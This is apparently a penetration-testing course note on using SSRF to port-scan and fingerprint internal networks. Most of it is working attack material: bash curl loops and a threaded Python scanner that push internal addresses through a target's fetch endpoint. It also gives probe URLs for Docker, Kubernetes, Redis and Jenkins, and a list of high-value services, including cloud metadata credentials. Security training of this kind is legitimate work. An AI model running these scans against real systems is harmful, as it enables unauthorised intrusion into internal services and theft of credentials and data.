---
tags: [vapt, ssrf, intermediate]
difficulty: intermediate
module: "13 - SSRF"
topic: "13.11 SSRF — Internal Port Scanning"
---

# 13.11 — SSRF: Internal Port Scanning

## Using SSRF to Map Internal Network

```
SSRF + PORT SCAN = INTERNAL NETWORK RECON

With SSRF you can:
  1. Discover which internal hosts exist
  2. Discover which ports are open on those hosts
  3. Identify internal services (Redis, Elasticsearch, etc.)
  4. Find admin panels not exposed to internet
  
DETECTION SIGNALS:
  "Connection refused"   → Host alive, port CLOSED
  "Connected" / 200 OK   → Host alive, port OPEN
  "Timeout"              → Host dead OR firewall dropping packets
  Response time < 200ms  → Host likely alive
  Response time > 3000ms → Host likely dead (ARP timeout)
```

---

## Manual Port Scanning

```bash
# SCAN COMMON PORTS ON LOCALHOST:
for port in 21 22 23 25 80 443 3000 3306 5432 6379 8080 8443 8500 9200 27017 50000; do
  result=$(curl -s -o /dev/null -w "%{http_code}" \
    --connect-timeout 2 \
    -X POST "https://target.com/fetch" \
    -d "url=http://127.0.0.1:$port/")
  
  [[ "$result" != "000" ]] && echo "Port $port: $result (OPEN!)" || echo "Port $port: closed/timeout"
done

# SCAN AN INTERNAL HOST:
for port in 80 443 8080 8443 8500 9200 9300 6379 5432 3306 27017 4567 4040 2181; do
  result=$(curl -s -o /dev/null -w "%{http_code}" \
    --connect-timeout 2 \
    -X POST "https://target.com/fetch" \
    -d "url=http://10.0.0.10:$port/")
  
  echo "10.0.0.10:$port → HTTP $result"
done
```

---

## Service Fingerprinting via SSRF

```bash
# ONCE PORT IS FOUND OPEN, IDENTIFY THE SERVICE:

# REDIS (port 6379):
url=http://127.0.0.1:6379/
# Expect: -ERR wrong number of arguments (Redis greeting)
# OR: +PONG if it accepts HTTP-like input

# ELASTICSEARCH (port 9200):
url=http://127.0.0.1:9200/
# Returns: {"name": "...", "cluster_name": "...", "version": {...}}

# MONGODB (port 27017):
url=http://127.0.0.1:27017/
# Returns some binary/garbage → still means port is OPEN!

# CONSUL (port 8500):
url=http://127.0.0.1:8500/v1/catalog/services
# Returns: JSON list of registered services!

# KUBERNETES API (port 6443 or 443):
url=http://10.96.0.1:443/version
# Returns: Kubernetes version info

# KUBERNETES API (Docker internal):
url=http://172.17.0.1:6443/version

# DOCKER API (port 2375):
url=http://127.0.0.1:2375/version
url=http://127.0.0.1:2375/containers/json
# Returns: Running containers! Critical!

# PROMETHEUS (port 9090):
url=http://127.0.0.1:9090/metrics
# Returns: metrics data (leaks internal info!)

# GRAFANA (port 3000):
url=http://127.0.0.1:3000/api/health
# Returns: {"database": "ok"}

# JENKINS (port 8080):
url=http://127.0.0.1:8080/
# Returns: Jenkins dashboard HTML!
```

---

## Automated Internal Network Scan

```python
# PYTHON SCRIPT FOR SSRF PORT SCANNING:
import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET = "https://target.com/fetch"
COOKIES = {"session": "YOUR_SESSION"}
INTERNAL_HOST = "127.0.0.1"

COMMON_PORTS = [
    21, 22, 25, 53, 80, 110, 143, 443, 
    445, 993, 995, 1080, 1521, 2375, 2379, 
    3000, 3306, 3389, 4040, 4567, 5000, 5432, 
    6379, 7474, 8080, 8443, 8500, 8888, 9000, 
    9090, 9200, 9300, 11211, 15672, 27017, 50000
]

def check_port(port):
    try:
        resp = requests.post(
            TARGET,
            data={"url": f"http://{INTERNAL_HOST}:{port}/"},
            cookies=COOKIES,
            timeout=5,
            allow_redirects=False
        )
        # Non-000 response = port is open or reachable
        return port, resp.status_code, len(resp.content)
    except requests.exceptions.Timeout:
        return port, "timeout", 0
    except Exception as e:
        return port, "error", 0

print(f"Scanning {INTERNAL_HOST}...")
with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(check_port, p) for p in COMMON_PORTS]
    for future in as_completed(futures):
        port, status, size = future.result()
        if status != "timeout" and status != "error":
            print(f"[OPEN] Port {port}: HTTP {status} ({size} bytes)")
```

---

## Interesting Internal Services to Target

```
HIGH-VALUE INTERNAL SERVICES (via SSRF):

UNAUTHENTICATED:
  Elasticsearch :9200    → All database contents!
  MongoDB :27017         → NoSQL data!  
  Redis :6379            → Cache, session tokens, data!
  Memcached :11211       → Cache data
  Docker API :2375       → Container management (RCE!)
  Kubernetes API :6443   → Container orchestration (RCE!)
  
ADMIN PANELS:
  Jenkins :8080          → CI/CD with build history
  Grafana :3000          → Monitoring dashboards
  Consul :8500           → Service mesh config
  Kibana :5601           → Elasticsearch dashboard
  RabbitMQ :15672        → Message queue management
  Prometheus :9090       → Metrics
  
DATABASES:
  MySQL :3306            → SQL queries via Gopher!
  PostgreSQL :5432       → SQL queries via Gopher!
  MSSQL :1433            → SQL queries

SPECIAL:
  AWS Metadata :169.254.169.254  → Cloud credentials!
  Kubernetes Metadata :169.254.169.254 → Pod service account token!
```

---

## Related Notes
- [[02 - Basic SSRF Fetching Internal URLs]] — basic SSRF
- [[08 - Semi-Blind SSRF Timing]] — timing-based scanning
- [[12 - SSRF Internal Services Redis Elasticsearch]] — exploiting found services
- [[09 - SSRF Cloud Metadata]] — cloud metadata
